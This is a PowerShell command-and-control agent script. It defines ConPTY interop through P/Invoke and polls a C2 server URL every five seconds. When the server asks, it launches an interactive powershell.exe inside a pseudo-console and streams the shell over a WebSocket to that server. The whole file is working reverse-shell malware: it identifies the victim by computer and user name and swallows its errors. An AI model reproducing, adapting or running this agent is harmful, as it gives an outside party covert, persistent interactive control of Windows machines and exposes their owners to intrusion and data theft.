# ConPTY Interactive Shell Agent
# Full TTY over WebSocket with mTLS support
# Requires Windows 10 1809+ for ConPTY

param(
    [string]$C2Url = "",
    [string]$AgentId = ""
)

# Configuration
if (-not $C2Url) { $C2Url = $env:C2_URL }
if (-not $AgentId) { $AgentId = "$env:COMPUTERNAME`_$env:USERNAME" }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ============================================================
# ConPTY API Definitions
# ============================================================
$ConPtyCode = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

public class ConPty {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, IntPtr lpPipeAttributes, uint nSize);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int ResizePseudoConsole(IntPtr hPC, COORD size);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void ClosePseudoConsole(IntPtr hPC);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    [DllImport("kernel32.dll")]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct COORD {
        public short X;
        public short Y;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    public const int PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
}
'@

Add-Type -TypeDefinition $ConPtyCode -ErrorAction SilentlyContinue

# ============================================================
# WebSocket Client (Pure .NET)
# ============================================================
Add-Type -AssemblyName System.Net.WebSockets -ErrorAction SilentlyContinue

function Start-InteractivePty {
    param([string]$WsUrl)
    
    Write-Host "[*] Starting ConPTY Interactive Shell..."
    Write-Host "[*] Connecting to: $WsUrl"
    
    # Create pipes for PTY I/O
    $inputReadPipe = [IntPtr]::Zero
    $inputWritePipe = [IntPtr]::Zero
    $outputReadPipe = [IntPtr]::Zero
    $outputWritePipe = [IntPtr]::Zero
    
    [ConPty]::CreatePipe([ref]$inputReadPipe, [ref]$inputWritePipe, [IntPtr]::Zero, 0) | Out-Null
    [ConPty]::CreatePipe([ref]$outputReadPipe, [ref]$outputWritePipe, [IntPtr]::Zero, 0) | Out-Null
    
    # Create Pseudo Console (120x30)
    $size = New-Object ConPty+COORD
    $size.X = 120
    $size.Y = 30
    $hPC = [IntPtr]::Zero
    
    $result = [ConPty]::CreatePseudoConsole($size, $inputReadPipe, $outputWritePipe, 0, [ref]$hPC)
    if ($result -ne 0) {
        Write-Host "[-] CreatePseudoConsole failed: $result"
        return
    }
    Write-Host "[+] ConPTY created"
    
    # Create process attribute list
    $attrSize = [IntPtr]::Zero
    [ConPty]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$attrSize) | Out-Null
    $attrList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([int]$attrSize)
    [ConPty]::InitializeProcThreadAttributeList($attrList, 1, 0, [ref]$attrSize) | Out-Null
    
    # Associate PTY with process
    [ConPty]::UpdateProcThreadAttribute(
        $attrList, 0,
        [IntPtr][ConPty]::PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
        $hPC,
        [IntPtr][System.Runtime.InteropServices.Marshal]::SizeOf([type][IntPtr]),
        [IntPtr]::Zero, [IntPtr]::Zero
    ) | Out-Null
    
    # Setup startup info
    $si = New-Object ConPty+STARTUPINFOEX
    $si.StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $si.lpAttributeList = $attrList
    
    # Create PowerShell process
    $pi = New-Object ConPty+PROCESS_INFORMATION
    $cmdLine = New-Object System.Text.StringBuilder "powershell.exe -NoLogo"
    
    $created = [ConPty]::CreateProcessW(
        $null,
        $cmdLine,
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        $false,
        [ConPty]::EXTENDED_STARTUPINFO_PRESENT,
        [IntPtr]::Zero,
        $null,
        [ref]$si,
        [ref]$pi
    )
    
    if (-not $created) {
        Write-Host "[-] CreateProcess failed"
        return
    }
    Write-Host "[+] PowerShell process started (PID: $($pi.dwProcessId))"
    
    # Connect WebSocket
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)
    
    try {
        $ws.ConnectAsync([Uri]$WsUrl, [Threading.CancellationToken]::None).Wait()
        Write-Host "[+] WebSocket connected"
    } catch {
        Write-Host "[-] WebSocket connection failed: $_"
        [ConPty]::TerminateProcess($pi.hProcess, 0)
        return
    }
    
    # Reader thread - PTY output -> WebSocket
    $readerJob = Start-Job -ScriptBlock {
        param($outputReadPipe, $ws)
        $buffer = New-Object byte[] 4096
        $bytesRead = 0
        
        while ($true) {
            if ([ConPty]::ReadFile($outputReadPipe, $buffer, 4096, [ref]$bytesRead, [IntPtr]::Zero)) {
                if ($bytesRead -gt 0) {
                    $segment = New-Object ArraySegment[byte] ($buffer, 0, $bytesRead)
                    $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait()
                }
            }
            Start-Sleep -Milliseconds 10
        }
    } -ArgumentList $outputReadPipe, $ws
    
    # Main loop - WebSocket input -> PTY
    $receiveBuffer = New-Object byte[] 4096
    $segment = New-Object ArraySegment[byte] $receiveBuffer
    
    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        try {
            $result = $ws.ReceiveAsync($segment, [Threading.CancellationToken]::None).Result
            
            if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Text) {
                $input = [System.Text.Encoding]::UTF8.GetString($receiveBuffer, 0, $result.Count)
                $inputBytes = [System.Text.Encoding]::UTF8.GetBytes($input)
                $written = 0
                [ConPty]::WriteFile($inputWritePipe, $inputBytes, $inputBytes.Length, [ref]$written, [IntPtr]::Zero) | Out-Null
            }
            elseif ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                break
            }
        } catch {
            break
        }
    }
    
    # Cleanup
    Write-Host "[*] Cleaning up..."
    Stop-Job $readerJob -ErrorAction SilentlyContinue
    Remove-Job $readerJob -ErrorAction SilentlyContinue
    [ConPty]::TerminateProcess($pi.hProcess, 0)
    [ConPty]::CloseHandle($pi.hProcess)
    [ConPty]::CloseHandle($pi.hThread)
    [ConPty]::ClosePseudoConsole($hPC)
    [ConPty]::CloseHandle($inputReadPipe)
    [ConPty]::CloseHandle($inputWritePipe)
    [ConPty]::CloseHandle($outputReadPipe)
    [ConPty]::CloseHandle($outputWritePipe)
    [ConPty]::DeleteProcThreadAttributeList($attrList)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($attrList)
    
    Write-Host "[*] PTY session ended"
}

# ============================================================
# Main - Check for PTY request and connect
# ============================================================
function Start-PtyLoop {
    while ($true) {
        try {
            # Check if PTY is requested
            $checkUrl = "$C2Url/bits/pty-status/$AgentId"
            $response = (New-Object Net.WebClient).DownloadString($checkUrl) | ConvertFrom-Json
            
            if ($response.pty_requested) {
                Write-Host "[!] PTY requested - starting interactive shell"
                $wsUrl = $C2Url -replace "^http", "ws"
                $wsUrl = "$wsUrl/ws-agent-pty/$AgentId"
                Start-InteractivePty -WsUrl $wsUrl
            }
        } catch {
            # Ignore errors
        }
        
        Start-Sleep -Seconds 5
    }
}

# Run
Write-Host "[*] ConPTY Agent starting..."
Write-Host "[*] Agent ID: $AgentId"
Write-Host "[*] C2 URL: $C2Url"
Start-PtyLoop
